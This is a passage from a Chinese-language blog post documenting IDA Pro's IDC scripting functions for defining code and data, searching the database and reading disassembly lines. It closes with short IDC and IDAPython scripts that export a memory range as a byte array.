<p>取消位于指定地址的顶的定义。这里的表示（参见<strong>IDC</strong>的<strong>MakeUnkn</strong>文档）指出是否也取消随后的项的定义，以及是否删除任何与取消定义的项有关的名称。相关函数<strong>MakeUnknown</strong>允许你取消大块数据的定义</p>
<h3 id="02-MakeCode"><a href="#02-MakeCode" class="headerlink" title="02 MakeCode"></a>02 MakeCode</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">MakeCode</span><span class="params">(<span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure>

<p>将位于指定地址的字节转换成一条指令。如果操作成功，则返回指令的长度，否则返回0</p>
<h3 id="03-MakeByte"><a href="#03-MakeByte" class="headerlink" title="03 MakeByte"></a>03 MakeByte</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">MakeByte</span><span class="params">(<span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure>

<p>将位于指定地址的项目转换成一个数据字节。类似的函数还包括<strong>MakeWord</strong>和<strong>MakeDword</strong></p>
<h3 id="04-MakeComm"><a href="#04-MakeComm" class="headerlink" title="04 MakeComm"></a>04 MakeComm</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">MakeComm</span><span class="params">(<span class="keyword">long</span> addr, <span class="built_in">string</span> comment)</span></span></span><br></pre></td></tr></table></figure>

<p>在给定的地址处添加一条常规注释</p>
<h3 id="05-MakeFunction"><a href="#05-MakeFunction" class="headerlink" title="05 MakeFunction"></a>05 MakeFunction</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">MakeFunction</span><span class="params">(<span class="keyword">long</span> begin, <span class="keyword">long</span> end)</span></span></span><br></pre></td></tr></table></figure>

<p>将由<strong>begin</strong>到<strong>end</strong>的指令转换成一个函数。如果<strong>end</strong>被指定为<strong>BADADDR(-1)</strong>，<strong>IDA</strong>会尝试通过定位函数的返回指令，来自动确定该函数的结束地址</p>
<h3 id="06-MakeStr"><a href="#06-MakeStr" class="headerlink" title="06 MakeStr"></a>06 MakeStr</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">MakeStr</span><span class="params">(<span class="keyword">long</span> begin, <span class="keyword">long</span> end)</span></span></span><br></pre></td></tr></table></figure>

<p>创建一个当前字符串(有<strong>GetStringType</strong>返回)类型的字符串，涵盖由<strong>begin</strong>到<strong>end-1</strong>之间的所有字节。如果<strong>end</strong>被指定为<strong>BADADDR(-1)</strong>，<strong>IDA</strong>会尝试自动确定字符串的结束位置</p>
<h2 id="0x10-数据库搜索函数"><a href="#0x10-数据库搜索函数" class="headerlink" title="0x10 数据库搜索函数"></a>0x10 数据库搜索函数</h2><p>在<strong>IDA</strong>中<strong>Find</strong>系列函数中的<strong>flags</strong>参数是一个位掩码，可用于指定查找操作的行为。3个最为常用的标志分别为<strong>SEARCH_DOWN</strong>，它指示搜索操作扫描高位地址；<strong>SEARCH_NEXT</strong>，它略过当前匹配项，以搜索下一个匹配项；<strong>SEARCH_CASE</strong>，它以区分大小写的方式进行二进制和文本搜索</p>
<h3 id="01-FindCode"><a href="#01-FindCode" class="headerlink" title="01 FindCode"></a>01 FindCode</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">FindCode</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> flags)</span></span></span><br></pre></td></tr></table></figure>

<p>从给定的地址搜索一条指令</p>
<h3 id="02-FindData"><a href="#02-FindData" class="headerlink" title="02 FindData"></a>02 FindData</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">FindData</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> flags)</span></span></span><br></pre></td></tr></table></figure>

<p>从给定的地址搜索一个数据项</p>
<h3 id="03-FindBinary"><a href="#03-FindBinary" class="headerlink" title="03 FindBinary"></a>03 FindBinary</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">FindBinary</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> flags, <span class="built_in">string</span> binary)</span></span></span><br></pre></td></tr></table></figure>

<p>从给定的地址搜索一个字节序列。字符<strong>binary</strong>指定一个十六进制字节序列值。如果没有设置<strong>SEARCH_CASE</strong>，且一个字节值指定了一个大写或小写<strong>ASCII</strong>字母，则搜索仍然会匹配对应的互补值。例如，”41 42”将匹配”61 62”和”61 42”，除非你设置了<strong>SEARCH_CASE</strong>标志位</p>
<h3 id="04-FindText"><a href="#04-FindText" class="headerlink" title="04 FindText"></a>04 FindText</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">FindText</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> flags, <span class="keyword">long</span> row, <span class="keyword">long</span> column, <span class="built_in">string</span> text)</span></span></span><br></pre></td></tr></table></figure>

<p>在给定的地址，从给定行（<strong>row</strong>）的给定列搜索字符串<strong>text</strong>。注意，某个给定地址的反汇编文本可能会跨越几行，因此，你需要指定搜索应从哪一行开始</p>
<h2 id="0x11-反汇编行组件"><a href="#0x11-反汇编行组件" class="headerlink" title="0x11 反汇编行组件"></a>0x11 反汇编行组件</h2><h3 id="01-GetDisasm"><a href="#01-GetDisasm" class="headerlink" title="01 GetDisasm"></a>01 GetDisasm</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">GetDisasm</span><span class="params">(<span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure>

<p>返回给定地址的反汇编文本。反回的文本包括任何注释，但不包括地址信息</p>
<h3 id="02-GetMnem"><a href="#02-GetMnem" class="headerlink" title="02 GetMnem"></a>02 GetMnem</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">GetMnem</span><span class="params">(<span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure>

<p>返回位于给定地址的指令的助记符部分</p>
<h3 id="03-GetOpnd"><a href="#03-GetOpnd" class="headerlink" title="03 GetOpnd"></a>03 GetOpnd</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">GetOpnd</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> opnm)</span></span></span><br></pre></td></tr></table></figure>

<p>返回指定地址的指定操作数的文本形式。IDA以零为起始编号，从左向右对操作数编号</p>
<h3 id="04-GetOpType"><a href="#04-GetOpType" class="headerlink" title="04 GetOpType"></a>04 GetOpType</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">GetOpType</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> opnum)</span></span></span><br></pre></td></tr></table></figure>

<p>返回一个整数，指出给定地址的给定操作数的类型。请参考<strong>IDC</strong>文档，了解操作数类型代码</p>
<h3 id="05-GetOperandValue"><a href="#05-GetOperandValue" class="headerlink" title="05 GetOperandValue"></a>05 GetOperandValue</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">GetOperandValue</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> opnum)</span></span></span><br></pre></td></tr></table></figure>

<p>返回与给定地址的给定操作数有关的整数值。返回值的性质取决于<strong>GetOpType</strong>指定的给定操作数的类型</p>
<h3 id="06-CommentEx"><a href="#06-CommentEx" class="headerlink" title="06 CommentEx"></a>06 CommentEx</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">CommentEx</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> type)</span></span></span><br></pre></td></tr></table></figure>

<p>返回给定地址处的注释文本。如果哦type为0，则返回常规注释的文本；如果type为1，则返回可重复注释的文本。如果给定地址处没有注释，则返回一个空字符串</p>
<h2 id="脚本示例"><a href="#脚本示例" class="headerlink" title="脚本示例"></a>脚本示例</h2><h3 id="IDC脚本"><a href="#IDC脚本" class="headerlink" title="IDC脚本"></a>IDC脚本</h3><p>实现的功能是导出一段内存的数据为数组形式</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> str_addr,end_addr,dat;</span><br><span class="line">str_addr = <span class="number">0x00413CD2</span>;</span><br><span class="line">end_addr = <span class="number">0x00413D1C</span>;</span><br><span class="line">dat = end_addr - str_addr;</span><br><span class="line"><span class="keyword">auto</span> i = <span class="number">0</span>;</span><br><span class="line">Message(<span class="string">"["</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;dat;i++)&#123; </span><br><span class="line">    <span class="keyword">if</span>(i != dat<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Message(<span class="string">"%d ,"</span>,Byte(str_addr+i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">         Message(<span class="string">"%d"</span>,Byte(str_addr+i));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Message(<span class="string">"]"</span>);</span><br></pre></td></tr></table></figure>

<h3 id="IDAPython脚本"><a href="#IDAPython脚本" class="headerlink" title="IDAPython脚本"></a>IDAPython脚本</h3><p>功能同上</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line">data = []</span><br><span class="line">model = <span class="string">"db"</span></span><br><span class="line">str_addr = <span class="number">0x00413CD2</span></span><br><span class="line">end_addr = <span class="number">0x00413D1C</span></span><br><span class="line">dat = end_addr - str_addr</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(dat):</span><br><span class="line">    <span class="keyword">if</span> model == <span class="string">"db"</span>:</span><br><span class="line">        data.append(Byte(str_addr + i))</span><br><span class="line">    <span class="keyword">if</span> model == <span class="string">"dw"</span>:</span><br><span class="line">        data.append(Word(str_addr + i))</span><br><span class="line">    <span class="keyword">if</span> model == <span class="string">"dd"</span>:</span><br><span class="line">        data.append(Dword(str_addr + i))</span><br><span class="line"><span class="keyword">print</span> data</span><br></pre></td></tr></table></figure>


        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
  </div>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="Vorherige Seite"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="Nächste Seite"></i></a>
  </nav>


          </div>
          

        </div>
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Inhaltsverzeichnis
        </li>
        <li class="sidebar-nav-overview">
          Übersicht
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ZERO-A-ONE</p>
  <div class="site-description" itemprop="description">Resit much,Obey little</div>
</div>
  <nav class="site-state motion-element">
      <div class="site-state-item site-state-posts">
        
          <a href="/archives/">
        
          <span class="site-state-item-count">71</span>
          <span class="site-state-item-name">Artikel</span>
        </a>
      </div>
    
      
      
      <div class="site-state-item site-state-categories">
        
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">Kategorien</span>
        
      </div>
    
  </nav>
  <div class="feed-link motion-element">
    <a href="/atom.xml" rel="alternate">
      <i class="fa fa-rss"></i>RSS
    </a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ZERO-A-ONE</span>
</div>
  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>

<div>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<span id="busuanzi_container_site_pv" style='display:none'>
    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
    <span class="post-meta-divider">|</span>
</span>
<span id="busuanzi_container_site_uv" style='display:none'>
    有<span id="busuanzi_value_site_uv"></span>人看过我的博客啦
</span>
</div>

        












        
      </div>
    </footer>
  </div>

  


  <script src="/lib/anime.min.js?v=3.1.0"></script>
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
<script src="/js/schemes/pisces.js?v=7.4.0"></script>

<script src="/js/next-boot.js?v=7.4.0"></script>



  








  <script src="/js/local-search.js?v=7.4.0"></script>














  

  

  

</body>
</html>
